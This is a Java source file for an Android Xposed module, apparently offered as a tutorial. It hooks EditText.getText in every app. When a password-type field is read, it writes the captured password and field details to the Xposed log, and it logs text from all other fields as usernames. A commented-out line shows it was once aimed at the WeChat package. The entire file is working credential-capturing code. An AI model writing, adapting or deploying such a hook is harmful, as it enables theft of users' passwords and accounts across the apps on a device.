package de.robv.android.xposed.mods.tutorial;

import android.widget.EditText;
import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;

public class XposedPassword implements IXposedHookLoadPackage {
	
	private String mEditTextName;
	private String password;
	private String username;
	public static int passwordID = 0;
	public static int usernameID = 0;

	@Override
	public void handleLoadPackage(LoadPackageParam lpparam) throws Throwable {
//		if (!lpparam.packageName.equals("com.tencent.mm"))
//            return;
		
		XposedHelpers.findAndHookMethod("android.widget.EditText",
				lpparam.classLoader, "getText",
				new XC_MethodHook() {

					@Override
					protected void beforeHookedMethod(MethodHookParam param)
							throws Throwable {
					}

					@Override
					protected void afterHookedMethod(MethodHookParam param)
							throws Throwable {
						
						Object obj = param.thisObject;
						if(obj instanceof EditText) {
							if (((EditText) obj).getInputType() == 129) {
								mEditTextName = ((EditText) obj).getClass().getName();
								passwordID = ((EditText) obj).getId();
								if (null != param.getResult()) {
									password = param.getResult().toString();
									XposedBridge.log("password class: "+ mEditTextName);
									XposedBridge.log("password id: "+ passwordID);
									XposedBridge.log("password value: "+ password);
								}
							} else {
								mEditTextName = ((EditText) obj).getClass().getName();
								usernameID = ((EditText) obj).getId();
								if (null != param.getResult()) {
									username = param.getResult().toString();
									XposedBridge.log("username class: "+ mEditTextName);
									XposedBridge.log("username id: "+ usernameID);
									XposedBridge.log("username value: "+ username);
								}
							}
						}
					}
				});
		
	}

}
